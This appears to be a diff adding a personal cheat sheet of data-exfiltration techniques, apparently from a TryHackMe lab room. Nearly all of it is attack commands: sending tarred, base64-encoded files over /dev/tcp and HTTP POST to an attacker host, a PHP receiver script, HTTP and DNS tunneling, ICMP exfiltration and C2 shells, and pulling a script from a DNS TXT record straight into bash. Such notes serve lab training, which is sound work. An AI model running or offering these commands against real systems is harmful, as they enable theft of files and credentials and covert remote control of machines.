@@ -1,0 +1,98 @@
+### exfiltration ###
+## links ##
+https://tryhackme.com/room/dataxexfilt
+
+
+
+## TCP socket ##
+# not secure if network is monitored
+ATT> nc -lvp 8080 > /tmp/task4-creds.data						# listen on attackbox
+PWN> tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080		# tar, encode, and send
+ATT> cd /tmp && dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar		# decode
+
+
+
+## SSH ##
+PWN> tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"			# tar, connect, detar
+
+
+
+## HTTP POST request ##
+# challenging to detect
+# ATT> contact.php
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+
+PWN> curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php	# tar, encode and POST
+ATT> sed -i 's/ /+/g' /tmp/http.bs64							# fix + replaced by " "
+ATT> cat /tmp/http.bs64 | base64 -d | tar xvfz -					# decode
+
+
+
+## HTTP TUNNELING ##
+# tools: https://github.com/L-codes/Neo-reGeorg
+ATT> cd /home/tristan/perso/secu/tools/Neo-reGeorg
+ATT> python3 neoreg.py generate -k KEY							# gen enc client
+# upload the file on the pwned machine
+ATT> python3 neoreg.py -k KEY -u http://10.10.101.133/uploader/files/tunnel.php		# connect to the tunnel
+# curl internal server of pwned machine trough the HTTPS proxy
+ATT> curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
+
+
+
+## ICMP ##
+# ICMP exfil
+ping 10.10.10.10 -c 1 -p 74686d3a7472796861636b6d650a					# pad with 16 hex bytes
+msfconsole
+> use auxiliary/server/icmp_exfil
+> set BPF_FILTER icmp and not src 10.8.98.114
+> set INTERFACE wlp2s0
+> run
+PWN> sudo nping --icmp -c 1 10.8.98.114 --data-string "BOFfile.txt"
+PWN> sudo nping --icmp -c 1 10.8.98.114 --data-string "admin:pass"
+PWN> sudo nping --icmp -c 1 10.8.98.114 --data-string "EOF"
+
+# ICMP C2
+# tool: https://github.com/krabelize/icmpdoor
+PWN> sudo icmpdoor -i eth0 -d 10.8.98.114
+ATT> sudo icmp-cnc -i eth1 -d $h
+ATT> shell: whoami
+
+
+
+## DNS Exfil
+# setup a DNS: https://tryhackme.com/room/dataxexfilt ::task8
+ATT> sudo tcpdump -i eth0 udp port 53 -v			# capture dns traffic
+PWN> cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
+PWN> cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+
+# C2 over DNS
+# add script to TXT DNS record
+# cat /tmp/script.sh | base64 
+PWN> dig +short -t TXT script.tunnel.com			# is TXT record OK ?
+PWN> dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+
+# DNS tunneling
+# tool: https://github.com/yarrick/iodine
+ATT> sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com	# server-side
+JMP> sudo iodine -P thmpass att.tunnel.com			# client-side on jumpbox
+ATT> ssh thm@10.1.1.2 -4 -f -N -D 1080				# ssh to jmp box trough dns
+ATT> curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php	# curl trought DNS
+
+
+
+
+
+
+
+
+
+
+
+
+
